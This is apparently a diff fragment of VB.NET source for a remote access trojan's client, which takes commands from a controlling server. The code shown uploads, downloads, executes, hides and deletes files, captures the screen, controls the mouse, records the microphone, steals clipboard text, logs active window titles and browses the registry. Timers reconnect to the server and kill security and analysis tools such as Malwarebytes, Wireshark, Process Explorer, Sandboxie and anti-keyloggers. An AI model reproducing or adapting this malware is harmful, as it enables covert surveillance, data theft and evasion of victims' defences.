+                    Try
+                        c.Send("FileManager" & "||" & getFolders(ala(1)) & getFiles(ala(1)))
+                    Catch
+                        c.Send("FileManager" & "||" & "Error")
+                    End Try
+                Case "sendfileto"
+                    IO.File.WriteAllBytes(ala(1), Convert.FromBase64String(ala(2)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+                    'dsfsadfasfas
+                Case "downloadedfile"
+                    IO.File.WriteAllBytes(Application.CommonAppDataPath & "\Computers\" & ala(2), Convert.FromBase64String(ala(1)))
+                    Threading.Thread.CurrentThread.Sleep(1000)
+
+                Case "Delete"
+                    Select Case ala(1)
+                        Case "Folder"
+                            IO.Directory.Delete(ala(2))
+                        Case "File"
+                            IO.File.Delete(ala(2))
+                    End Select
+                Case "Execute"
+                    Process.Start(ala(1))
+                Case "Rename"
+                    Select Case ala(1)
+                        Case "Folder"
+                            My.Computer.FileSystem.RenameDirectory(ala(2), ala(3))
+                        Case "File"
+                            My.Computer.FileSystem.RenameFile(ala(2), ala(3))
+                    End Select
+                Case "openfm"
+                    c.Send("openfm")
+                Case "BepX"
+                    Beep(ala(1), ala(2))
+                Case "ErorrMsg"
+                    Dim messageicon As MessageBoxIcon
+                    Dim messagebutton As MessageBoxButtons
+                    Select Case ala(1)
+                        Case "1"
+                            messageicon = MessageBoxIcon.Information
+                        Case "2"
+                            messageicon = MessageBoxIcon.Question
+                        Case "3"
+                            messageicon = MessageBoxIcon.Warning
+                        Case "4"
+                            messageicon = MessageBoxIcon.Error
+                    End Select
+                    Select Case ala(2)
+                        Case "1"
+                            messagebutton = MessageBoxButtons.YesNo
+                        Case "2"
+                            messagebutton = MessageBoxButtons.YesNoCancel
+                        Case "3"
+                            messagebutton = MessageBoxButtons.OK
+                        Case "4"
+                            messagebutton = MessageBoxButtons.OKCancel
+                        Case "5"
+                            messagebutton = MessageBoxButtons.RetryCancel
+                        Case "6"
+                            messagebutton = MessageBoxButtons.AbortRetryIgnore
+                    End Select
+                    MessageBox.Show(ala(4), ala(3), messagebutton, messageicon)
+                Case "!" ' server ask for my screen Size
+                    cap.Clear()
+                    Dim s = Screen.PrimaryScreen.Bounds.Size
+                    c.Send("!" & yy & s.Width & yy & s.Height)
+                Case "@" ' Start Capture
+                    Dim SizeOfimage As Integer = ala(1)
+                    Dim Split As Integer = ala(2)
+                    Dim Quality As Integer = ala(3)
+
+                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
+                    Dim M As New IO.MemoryStream
+                    Dim CMD As String = "@" & yy
+                    M.Write(SB(CMD), 0, CMD.Length)
+                    M.Write(Bb, 0, Bb.Length)
+                    c.Send(M.ToArray)
+                    M.Dispose()
+                Case "#" ' mouse clicks
+                    Cursor.Position = New Point(ala(1), ala(2))
+                    mouse_event(ala(3), 0, 0, 0, 1)
+                Case "$" '  mouse move
+                    Cursor.Position = New Point(ala(1), ala(2))
+
+
+
+
+
+                Case "hidefolderfile"
+                    Dim hiden As FileAttribute = FileAttribute.Hidden
+                    Try
+                        SetAttr(ala(1), hiden)
+                    Catch ex As Exception
+
+                    End Try
+                Case "showfolderfile"
+                    Dim shown As FileAttribute = FileAttribute.Normal
+                    Try
+                        SetAttr(ala(1), shown)
+                    Catch ex As Exception
+                    End Try
+
+
+
+            End Select
+        Catch ex As Exception
+        End Try
+
+    End Sub
+
+    Public ia As Integer = 0
+
+    Function startrec()
+        While My.Computer.FileSystem.FileExists(IO.Path.GetTempPath & "soundrec" & ia & ".wav")
+            ia = ia + 1
+        End While
+        mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
+        mciSendString("record recsound", "", 0, 0)
+    End Function
+    Function stoprec()
+        mciSendString("save recsound " & IO.Path.GetTempPath & "soundrec" & ia & ".wav", "", 0, 0)
+        mciSendString("close recsound", "", 0, 0)
+    End Function
+    Public Function ENB(ByRef s As String) As String ' Encode base64
+        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
+        ENB = Convert.ToBase64String(byt)
+    End Function
+    Public Function DEB(ByRef s As String) As String ' Decode Base64
+        Dim b As Byte() = Convert.FromBase64String(s)
+        DEB = System.Text.Encoding.UTF8.GetString(b)
+    End Function
+    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
+    Private Sub RS(ByVal a As Object, ByVal e As Object) 'Handles k.OutputDataReceived
+        Try
+            c.Send("rs" & yY & ENB(e.Data))
+        Catch ex As Exception
+        End Try
+    End Sub
+    Private Sub ex()
+        Try
+            c.Send("rsc" & yY)
+        Catch ex As Exception
+        End Try
+    End Sub
+    Delegate Sub gt() '----------- get text from clipborad
+    Function gtx() As String '----------- get text from clipborad
+        Dim str As String
+        str = Windows.Forms.Clipboard.GetText
+        C.Send("recvcli" & Yy & str)
+        Return True
+    End Function
+    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
+        'جمله شرطيه تفيد اذا لم يكن السيرفر متصل فعاود الاتصال
+        If c.Statconnected = False Then
+            c.Connect(host, port)
+        End If
+    End Sub
+    Sub chatappds(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
+        chat.TextBox1.Text = chat.TextBox1.Text & data1 & " said : " & data3 & vbNewLine
+        chat.Text = data2
+        chat.Show()
+    End Sub
+
+    Function rams() As Integer
+        rams = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
+    End Function
+
+    Private Sub taskmgrkiller_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles taskmgrkiller.Tick
+        Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
+        For Each X As Process In Code3
+            X.Kill()
+        Next
+    End Sub
+#Region " ====================================== RegistryManager ====================================== "
+    'By Bilel BHO, Dev-point CopyRight ©
+    '25/03/2013 Last Update
+
+    Public Sub GetRootSubs(ByVal lText As String)
+        ass = ""
+        Select Case lText
+
+            Case "HKEY_CLASSES_ROOT"
+                rK = Registry.ClassesRoot
+            Case "HKEY_CURRENT_USER"
+                rK = Registry.CurrentUser
+            Case "HKEY_LOCAL_MACHINE"
+                rK = Registry.LocalMachine
+            Case "HKEY_USERS"
+                rK = Registry.Users
+            Case "HKEY_CURRENT_CONFIG"
+                rK = Registry.CurrentConfig
+
+        End Select
+
+
+        c.Send("R_ROOTSUB" & "||" & GetRootSubKeys(rK))
+
+
+    End Sub
+
+    Public Function GetRootSubKeys(ByVal r As RegistryKey) As String
+        Dim holder As String = ""
+        For i As Integer = 0 To r.GetSubKeyNames.Length - 1
+            If i = r.GetSubKeyNames.Length - 1 Then
+                holder = holder & r.GetSubKeyNames(i)
+            Else
+                holder = holder & r.GetSubKeyNames(i) & "|"
+            End If
+        Next
+        Return holder
+    End Function
+
+    Public Sub GetData(ByVal lText As String)
+        Try
+            If lText = "..." Then
+
+                Try
+                    ass = ass.Replace(GetLast(ass, 0), "")
+                Catch
+                    Try : ass = ass.Replace(GetLast(ass, 1), "") : Catch : End Try
+                End Try
+
+                If Not ass.Length > 4 Then
+                    ass = ""
+                End If
+
+                ass = ass.Replace("\\", "\")
+
+                c.Send("R_CDIR" & "||" & ass)
+
+                c.Send("R_SUB" & "||" & GetSubKeys(rK, ass))
+
+                c.Send("R_VALUE" & "||" & GetValues(rK, ass))
+
+            Else
+                ass = ass & lText & "\"
+
+                ass = ass.Replace("\\", "\")
+
+                c.Send("R_CDIR" & "||" & ass)
+
+                c.Send("R_SUB" & "||" & GetSubKeys(rK, ass))
+
+                c.Send("R_VALUE" & "||" & GetValues(rK, ass))
+
+            End If
+        Catch
+        End Try
+    End Sub
+
+    Public Function GetLast(ByVal rootx As String, ByVal int As Integer)
+        Dim Last As String = ""
+        Try
+            Dim input As String = StrReverse(rootx)
+            Dim x As String() = input.Split("\")
+            Last = StrReverse(x(int))
+        Catch
+        End Try
+        Return Last
+    End Function
+
+    Public Function GetValues(ByVal r As RegistryKey, ByVal location As String) As String
+        Dim holder As String = ""
+        For i As Integer = 0 To r.OpenSubKey(location).GetValueNames.Length - 1
+            If i = r.OpenSubKey(location).GetValueNames.Length - 1 Then
+                holder = holder & r.OpenSubKey(location).GetValueNames(i) & "}" & r.OpenSubKey(location).GetValueKind(r.OpenSubKey(location).GetValueNames(i)).ToString & "}" & r.OpenSubKey(location).GetValue(r.OpenSubKey(location).GetValueNames(i)).ToString
+            Else
+                holder = holder & r.OpenSubKey(location).GetValueNames(i) & "}" & r.OpenSubKey(location).GetValueKind(r.OpenSubKey(location).GetValueNames(i)).ToString & "}" & r.OpenSubKey(location).GetValue(r.OpenSubKey(location).GetValueNames(i)).ToString & "|"
+            End If
+        Next
+        Return holder
+    End Function
+
+    Public Function GetSubKeys(ByVal r As RegistryKey, ByVal location As String) As String
+        Dim holder As String = ""
+        For i As Integer = 0 To r.OpenSubKey(location).GetSubKeyNames.Length - 1
+            If i = r.OpenSubKey(location).GetSubKeyNames.Length - 1 Then
+                holder = holder & r.OpenSubKey(location).GetSubKeyNames(i)
+            Else
+                holder = holder & r.OpenSubKey(location).GetSubKeyNames(i) & "|"
+            End If
+        Next
+        Return holder
+    End Function
+
+#End Region
+
+    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
+
+        Dim CapTxt As String = GetCaption()
+        If makel <> CapTxt Then
+            makel = CapTxt
+            ' stop timer before showing msgbox so it is not detected!
+            Timer1.Stop()
+            c.Send("AW" & yy & CapTxt)
+            ' resume timer 
+            Timer1.Start()
+        End If
+    End Sub
+    Private Function GetCaption() As String
+        Dim Caption As New System.Text.StringBuilder(256)
+        Dim hWnd As IntPtr = GetForegroundWindow()
+        GetWindowText(hWnd, Caption, Caption.Capacity)
+        Return Caption.ToString()
+    End Function
+
+
+    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
+        On Error Resume Next
+        Dim Code() As Process = System.Diagnostics.Process.GetProcessesByName("procexp")
+        For Each X As Process In Code
+            X.Kill()
+        Next
+        Dim a() As Process = System.Diagnostics.Process.GetProcessesByName("procexp64")
+        For Each X As Process In a
+            X.Kill()
+        Next
+        
+    End Sub
+
+    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
+        Dim Code1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
+        For Each X As Process In Code1
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
+        Dim Code2() As Process = System.Diagnostics.Process.GetProcessesByName("SpeedGear")
+        For Each X As Process In Code2
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer6_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer6.Tick
+        Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
+        For Each x As Process In Code3
+            x.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick
+        Dim Code4() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
+        For Each X As Process In Code4
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer8_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer8.Tick
+        Dim Code5() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
+        For Each X As Process In Code5
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer9_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer9.Tick
+        Dim Code6() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
+        For Each X As Process In Code6
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer10_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer10.Tick
+        Dim Code7() As Process = System.Diagnostics.Process.GetProcessesByName("cports")
+        For Each X As Process In Code7
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer11_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer11.Tick
+        Dim Code8() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessHacker")
+        For Each X As Process In Code8
+            X.Kill()
+        Next
+    End Sub
+
+    Private Sub Timer12_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer12.Tick
+        Try
+            Dim AntiLogger() As Process = Process.GetProcessesByName("AntiLogger")
+
+            For Each Process As Process In AntiLogger
+                Process.Kill()
+            Next
+
+        Catch x As Exception
+        End Try
+    End Sub
+
+    Private Sub Timer13_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer13.Tick
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "keyscrambler"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+
+    Private Sub Timer14_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer14.Tick
+        Dim generaldee As Process() = Process.GetProcesses
+        Dim i As Integer
+        For i = 0 To generaldee.Length - 1
+            Select Case Strings.LCase(generaldee(i).ProcessName)
+                Case "xns5"
+                    generaldee(i).Kill()
+                Case Else
+            End Select
+        Next
+    End Sub
+
+    Private Sub Timer15_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer15.Tick
+
+    End Sub
+End Class
